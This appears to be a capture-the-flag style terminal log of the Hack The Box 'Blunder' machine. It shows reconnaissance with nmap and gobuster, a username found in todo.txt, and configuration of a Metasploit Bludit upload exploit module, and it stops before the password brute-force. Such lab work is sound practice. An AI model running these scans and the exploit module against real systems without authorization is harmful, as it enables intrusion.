allenwest1@debian:~$ ping 10.10.10.191
PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=24.10 ms
64 bytes from 10.10.10.191: icmp_seq=2 ttl=63 time=22.9 ms
^C
--- 10.10.10.191 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 2ms
rtt min/avg/max/mdev = 22.895/23.929/24.964/1.046 ms
allenwest1@debian:~$ nmap -sV -sC 10.10.10.191
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-23 09:59 EDT
Nmap scan report for 10.10.10.191
Host is up (0.030s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
allenwest1@debian:~$ gobuster
2020/06/23 10:01:14 [!] 2 errors occurred:
        * WordList (-w): Must be specified (use `-w -` for stdin)
        * Url/Domain (-u): Must be specified
allenwest1@debian:~/Desktop$ sudo gobuster -u http://10.10.10.191/ -w directory-list-2.3-medium.txt -x txt,php,py,cgi

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.191/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php,py,cgi
[+] Timeout      : 10s
=====================================================
2020/06/23 10:10:19 Starting gobuster
=====================================================
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/todo.txt (Status: 200)
.
.
.
// Admin is always interesting so I'm checking it out.
// Admin is a login page with BLUDIT as the title
// Search online for BLUDIT exploit
// Found an interesting one @ https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec
// msf > use exploit/linux/http/bludit_upload_images_exec
.
.
.
allenwest1@debian:~/Desktop$ msfconsole
Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
Starting database at /home/allenwest1/.msf4/db...success
[?] Initial MSF web service account username? [allenwest1]: 
[?] Initial MSF web service account password? (Leave blank for random password): 
Generating SSL key and certificate for MSF web service
MSF web service PID file found, but no active process running as PID 1541
Deleting MSF web service PID file /home/allenwest1/.msf4/msf-ws.pid
Attempting to start MSF web service...failed
[!] MSF web service appears to be started, but may not operate as expected.
MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
Please see /home/allenwest1/.msf4/logs/msf-ws.log for additional details.
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params set LHOST eth0  
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > show options 
Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
.
.
.
// Here we see the option to set username so I had to search some of the other directories for clues
// In /todo.txt we see the following:
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
// Indicating that 'fergus' is a user or possibly admin
.
.
.
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus 
.
.
.
// To brute for password, I will continue in terminal2.bash and come back here once I have found it.
.
.
.


